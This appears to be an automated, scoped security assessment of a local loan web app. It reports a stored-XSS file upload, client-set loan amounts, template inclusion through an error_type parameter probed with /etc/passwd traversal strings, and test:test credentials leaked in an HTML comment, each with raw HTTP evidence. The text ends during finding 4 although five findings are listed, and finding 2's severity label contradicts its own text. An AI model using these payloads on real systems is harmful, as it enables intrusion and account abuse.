# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — xss-stored Unrestricted file upload → stored XSS via profile image (arbitrary HTML/JS served from app origin)](#finding-1)
    - [2. HIGH — price-tampering No server-side validation of loan financial fields on profile update (client-controlled monthly_payment / loan_amount / term)](#finding-2)
    - [3. HIGH — path-traversal Arbitrary server-side template inclusion via error_type (LFI within templates dir)](#finding-3)
    - [4. MEDIUM — secret-exposure Working credentials (test:test) exposed in login page HTML source comment](#finding-4)
    - [5. LOW — rate-limit No rate-limiting / brute-force protection on POST /login](#finding-5)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr30qg6o-0ffado` |
| Target | http://target.local:32835/login |
| Started | 2026-07-02T04:42:46.012Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 5 mapped · 5 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 5 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32835`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

5 finding(s): 3 high, 1 medium, 1 low

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [xss-stored] Unrestricted file upload → stored XSS via profile image (arbitrary HTML/JS served from app origin)

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32835/login

The profile image upload (POST /update_profile, field image_profile) performs no file-type, extension, content, or magic-byte validation. An arbitrary file is stored under the web-served directory /static/images/ with its original filename preserved and served back with a content-type derived from the extension. Uploading a file named verdict_xss.html with HTML/script content results in it being served at http://target.local:32835/static/images/verdict_xss.html with content-type: text/html and the script payload intact and unescaped, so any browser navigating to that URL executes attacker-controlled JavaScript in the application's origin. The file is retrievable UNAUTHENTICATED (Apache static serving, also Access-Control-Allow-Origin: *). An earlier benign upload confirmed there is no content inspection (plain text was accepted and served as image/gif). This is a persistent (stored) XSS hosted in the trusted origin; the HttpOnly session cookie prevents token theft but the payload can still perform authenticated actions as any lured victim, run phishing, or pivot via same-origin trust.

**Reproduction**

```
1. Log in (role test). 2. POST /update_profile as multipart/form-data with the required text fields plus file field image_profile = filename "verdict_xss.html", content-type text/html, body "<html><body><script>alert(document.domain)</script>VERDICTXSSPROOF</body></html>" (ev-mr31529x-1q, 200). 3. GET /static/images/verdict_xss.html (no auth needed) → 200, content-type: text/html, body is the exact script (ev-mr315758-1r, replayed ev-mr3157va-1s). 4. Negative control: GET /static/images/verdict_nonexistent_xyz.html → 404 (ev-mr3158k4-1t). A browser opening the payload URL executes the JavaScript in the app origin.
```

**Evidence**

- Evidence `ev-mr3158k4-1t` — `artifacts/s-0003/ev-mr3158k4-1t/`

Request:

```http
GET /static/images/verdict_nonexistent_xyz.html HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 319
content-type: text/html; charset=iso-8859-1
date: Thu, 02 Jul 2026 04:54:15 GMT
keep-alive: timeout=5, max=98
server: Apache/2.4.67 (Debian)

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.67 (Debian) Server at target.local Port 32835</address>
</body></html>
```

- Evidence `ev-mr315758-1r` — `artifacts/s-0003/ev-mr315758-1r/`

Request:

```http
GET /static/images/verdict_xss.html HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
access-control-allow-origin: *
connection: Keep-Alive
content-length: 79
content-type: text/html
date: Thu, 02 Jul 2026 04:54:13 GMT
etag: "4f-65599991dc262-gzip"
keep-alive: timeout=5, max=100
last-modified: Thu, 02 Jul 2026 04:54:07 GMT
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<html><body><script>alert(document.domain)</script>VERDICTXSSPROOF</body></html>
```

- Evidence `ev-mr3157va-1s` — `artifacts/s-0003/ev-mr3157va-1s/`

Request:

```http
GET /static/images/verdict_xss.html HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
access-control-allow-origin: *
connection: Keep-Alive
content-length: 79
content-type: text/html
date: Thu, 02 Jul 2026 04:54:14 GMT
etag: "4f-65599991dc262-gzip"
keep-alive: timeout=5, max=99
last-modified: Thu, 02 Jul 2026 04:54:07 GMT
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<html><body><script>alert(document.domain)</script>VERDICTXSSPROOF</body></html>
```

<a id="finding-2"></a>

### 2. [HIGH] [price-tampering] No server-side validation of loan financial fields on profile update (client-controlled monthly_payment / loan_amount / term)

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32835/login

POST /update_profile stores the loan financial fields (loan_amount, loan_term_months, monthly_payment) exactly as supplied by the client with no server-side validation, bounds checking, or recomputation. A borrower can submit an internally inconsistent loan — e.g. loan_amount=999999.99 with loan_term_months=1 and monthly_payment=7.77 — and it is accepted and persisted (the tampered monthly_payment 7.77 is echoed back, value="7.77"), whereas the legitimate baseline (monthly_payment=850.0) does not contain it. In a loan application, monthly_payment should be derived server-side from principal, term and rate; allowing the client to set it independently (and to negative/zero/oversized values) lets a user define their own repayment terms — committing to owe a large principal while paying a trivial amount. Impact is bounded by whatever downstream process (e.g. the Loan Details view / any approval flow) trusts these self-reported figures; because the values are only on the user's own record it is not a direct cross-user compromise, hence medium.

**Reproduction**

```
1. Log in (role test). 2. Baseline: POST /update_profile (urlencoded) with legitimate values incl. monthly_payment=850.0 → 200, response does NOT contain value="7.77" (ev-mr318n5x-1z). 3. Mutated: POST /update_profile with loan_amount=999999.99&loan_term_months=1&monthly_payment=7.77 → 200, response contains value="7.77" proving the inconsistent figures were accepted and stored (ev-mr318nel-20, replayed ev-mr318nn1-21). No error/validation is returned for the impossible loan math.
```

**Evidence**

- Evidence `ev-mr318n5x-1z` — `artifacts/s-0003/ev-mr318n5x-1z/`

Request:

```http
POST /update_profile HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

name=John&lastname=Doe&email=john@example.com&loan_amount=10000.0&loan_term_months=12&monthly_payment=850.0
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 5245
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:56:54 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profile</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>User Profile</h2>
                <form method="post" enctype="multipart/form-data" action="/update_profile">
                    <div class="mb-3">
                        <label for="name" class="form-label">Name:</label>
                        <input type="text" class="form-control" id="name" name="name" value="John" required>
                    </div>
                    <div class="mb-3">
                        <label for="lastname" class="form-label">Last Name:</label>
                        <input type="text" class="form-control" id="lastname" name="lastname" value="Doe" required>
                    </div>
                    <div class="mb-3">
                        <label for="email" class="form-label">Email:</label>
                        <input type="email" class="form-control" id="email" name="email" value="john@example.com" required>
                    </div>
                    <div class="mb-3">
                        <label for="loan_amount" class="form-label">Loan Amount:</label>
                        <input type="text" class="form-control" id="loan_amount" name="loan_amount" value="10000.0" required>
                    </div>
                    <div class="mb-3">
                        <label for="loan_term_months" class="form-label">Loan Term (Months):</label>
                        <input type="text" class="form-control" id="loan_term_months" name="loan_term_months" value="12" required>
                    </div>
                    <div class="mb-3">
                        <label for="monthly_payment" class="form-label">Monthly Payment:</label>
                        <input type="text" class="form-control" id="monthly_payment" name="monthly_payment" value="850.0" required>
                    </div>
                    <!-- New input for uploading profile image -->
                    <div class="mb-3">
                        <label for="image_profile_filename" class="form-label">Image Profile:</label>
                        <input type="file" class="form-control" id="profile_image" name="image_profile" style="opacity:0;height:0;">
                    
                        <div class="input-group mb-3">
                            <span class="input-group-text" id="text_input_span_id">Select Image</span>
                            <!-- use 'caret-color: transparent' to hide input cursor, set autocomplete to off to remove possible input hint -->
                            <input type="text" id='text_input_id' class="form-control" placeholder="verdict_xss.html" style="caret-color: transparent" autocomplete="off">
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary">Update Profile</button>
                </form>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/home">Home</a></li>
                            <li class="list-group-item"><a href="/profile">Profile</a></li>
                            <li class="list-group-item"><a href="/error?error_type=not_implemented.html&amp;error_message=The+%60Loan+Request%60+feature+is+not+implemented+yet.">Loan Request</a></li>
                            <li class="list-group-item"><a href="/loan_details">Loan Details</a></li>
                            <li class="list-group-item"><a href="/logout">Exit</a></li>
                        </ul>
                    </div>
                </div>
                <!-- Profile Image Section -->
                <div class="card mt-3">
                    <div class="card-body">
                        <h5 class="card-title">Profile Image</h5>
                        <img src="/static/images/verdict_xss.html" alt="Profile Image" class="img-fluid">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- use online jQuery -->
    <script src="/static/js/jquery.min.js"></script>
    <script>
    // bind file-input-form click action to text-input-span
    $('#text_input_span_id').click(function () {
        $("#profile_image").trigger('click');
    })
    // bind file-input-form click action to text-input-form
    $('#text_input_id').click(function () {
        $("#profile_image").trigger('click');
    })
    // display file name in text-input-form    
    $("#profile_image").change(function () {            
        $('#text_input_id').val(this.value.replace(/C:\\fakepath\\/i, ''))
    })
    </script>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr318nel-20` — `artifacts/s-0003/ev-mr318nel-20/`

Request:

```http
POST /update_profile HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

name=John&lastname=Doe&email=john@example.com&loan_amount=999999.99&loan_term_months=1&monthly_payment=7.77
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 5245
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:56:54 GMT
expires: 0
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profile</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>User Profile</h2>
                <form method="post" enctype="multipart/form-data" action="/update_profile">
                    <div class="mb-3">
                        <label for="name" class="form-label">Name:</label>
                        <input type="text" class="form-control" id="name" name="name" value="John" required>
                    </div>
                    <div class="mb-3">
                        <label for="lastname" class="form-label">Last Name:</label>
                        <input type="text" class="form-control" id="lastname" name="lastname" value="Doe" required>
                    </div>
                    <div class="mb-3">
                        <label for="email" class="form-label">Email:</label>
                        <input type="email" class="form-control" id="email" name="email" value="john@example.com" required>
                    </div>
                    <div class="mb-3">
                        <label for="loan_amount" class="form-label">Loan Amount:</label>
                        <input type="text" class="form-control" id="loan_amount" name="loan_amount" value="1000000.0" required>
                    </div>
                    <div class="mb-3">
                        <label for="loan_term_months" class="form-label">Loan Term (Months):</label>
                        <input type="text" class="form-control" id="loan_term_months" name="loan_term_months" value="1" required>
                    </div>
                    <div class="mb-3">
                        <label for="monthly_payment" class="form-label">Monthly Payment:</label>
                        <input type="text" class="form-control" id="monthly_payment" name="monthly_payment" value="7.77" required>
                    </div>
                    <!-- New input for uploading profile image -->
                    <div class="mb-3">
                        <label for="image_profile_filename" class="form-label">Image Profile:</label>
                        <input type="file" class="form-control" id="profile_image" name="image_profile" style="opacity:0;height:0;">
                    
                        <div class="input-group mb-3">
                            <span class="input-group-text" id="text_input_span_id">Select Image</span>
                            <!-- use 'caret-color: transparent' to hide input cursor, set autocomplete to off to remove possible input hint -->
                            <input type="text" id='text_input_id' class="form-control" placeholder="verdict_xss.html" style="caret-color: transparent" autocomplete="off">
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary">Update Profile</button>
                </form>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/home">Home</a></li>
                            <li class="list-group-item"><a href="/profile">Profile</a></li>
                            <li class="list-group-item"><a href="/error?error_type=not_implemented.html&amp;error_message=The+%60Loan+Request%60+feature+is+not+implemented+yet.">Loan Request</a></li>
                            <li class="list-group-item"><a href="/loan_details">Loan Details</a></li>
                            <li class="list-group-item"><a href="/logout">Exit</a></li>
                        </ul>
                    </div>
                </div>
                <!-- Profile Image Section -->
                <div class="card mt-3">
                    <div class="card-body">
                        <h5 class="card-title">Profile Image</h5>
                        <img src="/static/images/verdict_xss.html" alt="Profile Image" class="img-fluid">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- use online jQuery -->
    <script src="/static/js/jquery.min.js"></script>
    <script>
    // bind file-input-form click action to text-input-span
    $('#text_input_span_id').click(function () {
        $("#profile_image").trigger('click');
    })
    // bind file-input-form click action to text-input-form
    $('#text_input_id').click(function () {
        $("#profile_image").trigger('click');
    })
    // display file name in text-input-form    
    $("#profile_image").change(function () {            
        $('#text_input_id').val(this.value.replace(/C:\\fakepath\\/i, ''))
    })
    </script>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr318nn1-21` — `artifacts/s-0003/ev-mr318nn1-21/`

Request:

```http
POST /update_profile HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

name=John&lastname=Doe&email=john@example.com&loan_amount=999999.99&loan_term_months=1&monthly_payment=7.77
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 5245
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:56:55 GMT
expires: 0
keep-alive: timeout=5, max=98
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profile</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>User Profile</h2>
                <form method="post" enctype="multipart/form-data" action="/update_profile">
                    <div class="mb-3">
                        <label for="name" class="form-label">Name:</label>
                        <input type="text" class="form-control" id="name" name="name" value="John" required>
                    </div>
                    <div class="mb-3">
                        <label for="lastname" class="form-label">Last Name:</label>
                        <input type="text" class="form-control" id="lastname" name="lastname" value="Doe" required>
                    </div>
                    <div class="mb-3">
                        <label for="email" class="form-label">Email:</label>
                        <input type="email" class="form-control" id="email" name="email" value="john@example.com" required>
                    </div>
                    <div class="mb-3">
                        <label for="loan_amount" class="form-label">Loan Amount:</label>
                        <input type="text" class="form-control" id="loan_amount" name="loan_amount" value="1000000.0" required>
                    </div>
                    <div class="mb-3">
                        <label for="loan_term_months" class="form-label">Loan Term (Months):</label>
                        <input type="text" class="form-control" id="loan_term_months" name="loan_term_months" value="1" required>
                    </div>
                    <div class="mb-3">
                        <label for="monthly_payment" class="form-label">Monthly Payment:</label>
                        <input type="text" class="form-control" id="monthly_payment" name="monthly_payment" value="7.77" required>
                    </div>
                    <!-- New input for uploading profile image -->
                    <div class="mb-3">
                        <label for="image_profile_filename" class="form-label">Image Profile:</label>
                        <input type="file" class="form-control" id="profile_image" name="image_profile" style="opacity:0;height:0;">
                    
                        <div class="input-group mb-3">
                            <span class="input-group-text" id="text_input_span_id">Select Image</span>
                            <!-- use 'caret-color: transparent' to hide input cursor, set autocomplete to off to remove possible input hint -->
                            <input type="text" id='text_input_id' class="form-control" placeholder="verdict_xss.html" style="caret-color: transparent" autocomplete="off">
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary">Update Profile</button>
                </form>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/home">Home</a></li>
                            <li class="list-group-item"><a href="/profile">Profile</a></li>
                            <li class="list-group-item"><a href="/error?error_type=not_implemented.html&amp;error_message=The+%60Loan+Request%60+feature+is+not+implemented+yet.">Loan Request</a></li>
                            <li class="list-group-item"><a href="/loan_details">Loan Details</a></li>
                            <li class="list-group-item"><a href="/logout">Exit</a></li>
                        </ul>
                    </div>
                </div>
                <!-- Profile Image Section -->
                <div class="card mt-3">
                    <div class="card-body">
                        <h5 class="card-title">Profile Image</h5>
                        <img src="/static/images/verdict_xss.html" alt="Profile Image" class="img-fluid">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- use online jQuery -->
    <script src="/static/js/jquery.min.js"></script>
    <script>
    // bind file-input-form click action to text-input-span
    $('#text_input_span_id').click(function () {
        $("#profile_image").trigger('click');
    })
    // bind file-input-form click action to text-input-form
    $('#text_input_id').click(function () {
        $("#profile_image").trigger('click');
    })
    // display file name in text-input-form    
    $("#profile_image").change(function () {            
        $('#text_input_id').val(this.value.replace(/C:\\fakepath\\/i, ''))
    })
    </script>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [HIGH] [path-traversal] Arbitrary server-side template inclusion via error_type (LFI within templates dir)

- Screen: `s-0005`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32835/login

The /error page renders the query param error_type as a server-side Jinja template name (an {% include error_type %}-style pattern): the selected template is rendered and nested inside the error page's <div class="error-content">. An attacker can force the server to render ANY template in the application's templates directory. error_type=login.html returns 200 and embeds the full login template; error_type=loan_details.html embeds that template's markup — both distinct from the intended not_implemented.html. A non-existent name (nonexistent_xyz.html), admin.html and base.html return a generic 500 (TemplateNotFound / render error). This is a user-controlled file/template inclusion primitive (CWE-98/CWE-1336). Absolute paths (/etc/passwd) and ../ traversal are rejected by Jinja's FileSystemLoader, so it is confined to the templates root — no arbitrary-filesystem read or RCE was achieved. The separate params error_message is unused (not reflected) and neither param is XSS/SSTI/SQLi injectable (template content is fixed on disk; the user only chooses which file). The 500 responses are generic (Flask debug off) — no stack-trace disclosure. Impact: any authenticated user can enumerate and disclose the source/rendered output of arbitrary server-side templates and render them outside their intended access-control context; a chain to SSTI/RCE would require the ability to place attacker-controlled content into a template-loadable path (not demonstrated).

**Reproduction**

```
1. GET /error?error_type=nonexistent_xyz.html&error_message=test -> 500 Internal Server Error (negative control, no template included). 2. GET /error?error_type=login.html&error_message=replayA -> 200; response nests the full login.html template inside <div class="error-content"> (contains <title>Login</title> and <form id="loginForm" action="/login" method="post">). 3. Repeat step 2 (replayB) -> identical 200 inclusion (stable). 4. GET /error?error_type=loan_details.html -> 200 embedding the loan_details template. 5. GET /error?error_type=/etc/passwd and ...=../../../etc/passwd -> 500 (traversal outside templates dir blocked). The attacker controls which server-side template the app renders.
```

**Evidence**

- Evidence `ev-mr31j2ht-34` — `artifacts/s-0005/ev-mr31j2ht-34/`

Request:

```http
GET /error?error_type=nonexistent_xyz.html&error_message=test HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 500
cache-control: public, max-age=0
connection: close
content-length: 265
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:05:00 GMT
expires: 0
pragma: no-cache
server: Apache/2.4.67 (Debian)

<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

- Evidence `ev-mr31l8zt-3b` — `artifacts/s-0005/ev-mr31l8zt-3b/`

Request:

```http
GET /error?error_type=login.html&error_message=replayA HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 3572
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:06:42 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
    <style>
        .error-container {
            margin-top: 50px;
            text-align: center;
        }
        .error-message {
            font-size: 24px;
            color: red;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Error!</h2>
                
                    <div class="error-content">
                        <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <!-- TODO: Delete the testing account (test:test). --> 
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center">Login</h2>
                        <form id="loginForm" action="/login" method="post">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username:</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password:</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Login</button>
                        </form>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
                    </div>
                
                <a href="/home" class="btn btn-primary">Back to Home</a>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/home">Home</a></li>
                            <li class="list-group-item"><a href="/profile">Profile</a></li>
                            <li class="list-group-item"><a href="/error?error_type=not_implemented.html&amp;error_message=The+%60Loan+Request%60+feature+is+not+implemented+yet.">Loan Request</a></li>
                            <li class="list-group-item"><a href="/loan_details">Loan Details</a></li>
                            <li class="list-group-item"><a href="/logout">Exit</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr31l9of-3c` — `artifacts/s-0005/ev-mr31l9of-3c/`

Request:

```http
GET /error?error_type=login.html&error_message=replayB HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 3572
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:06:43 GMT
expires: 0
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
    <style>
        .error-container {
            margin-top: 50px;
            text-align: center;
        }
        .error-message {
            font-size: 24px;
            color: red;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Error!</h2>
                
                    <div class="error-content">
                        <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <!-- TODO: Delete the testing account (test:test). --> 
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center">Login</h2>
                        <form id="loginForm" action="/login" method="post">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username:</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password:</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Login</button>
                        </form>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
                    </div>
                
                <a href="/home" class="btn btn-primary">Back to Home</a>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/home">Home</a></li>
                            <li class="list-group-item"><a href="/profile">Profile</a></li>
                            <li class="list-group-item"><a href="/error?error_type=not_implemented.html&amp;error_message=The+%60Loan+Request%60+feature+is+not+implemented+yet.">Loan Request</a></li>
                            <li class="list-group-item"><a href="/loan_details">Loan Details</a></li>
                            <li class="list-group-item"><a href="/logout">Exit</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [MEDIUM] [secret-exposure] Working credentials (test:test) exposed in login page HTML source comment

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32835/login

The /login page HTML contains an unremoved developer comment leaking valid, working account credentials: "&lt;!-- TODO: Delete the testing account (test:test). --&gt;". These credentials are live — POSTing username=test&password=test returns HTTP 302 to /home with a valid session cookie (session=eyJ1c2VyX2lkIjoxfQ...). Any unauthenticated visitor who views source obtains authenticated access to the application as user_id 1. The comment is present in every response from the endpoint (GET page render and POST error render).

**Reproduction**

```
1. GET http://target.local:32835/login (no auth). 2. View HTML source: observe the comment "&lt;!-- TODO: Delete the testing account (test:test). --&gt;" near the top of the body. 3. POST /login with body username=test&password=test → HTTP 302 Location: /home with Set-Cookie session=... confirming the leaked credentials are valid. Negative control: the 302 redirect body (post-auth) does not contain the comment; the login page renders do.
```

**Evidence**

- Evidence `ev-mr30vlub-r` — `artifacts/s-0001/ev-mr30vlub-r/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=test&password=test
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 197
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:46:46 GMT
expires: 0
keep-alive: timeout=5, max=100
location: /home
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/home">/home</a>. If not, click the link.
```

- Evidence `ev-mr30unfi-1` — `artifacts/s-0001/ev-mr30unfi-1/`

Request:

```http
GET /login HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1642
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:46:01 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <!-- TODO: Delete the testing account (test:test). --> 
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center">Login</h2>
                        <form id="loginForm" action="/login" method="post">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username:</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password:</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Login</button>
                        </form>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>

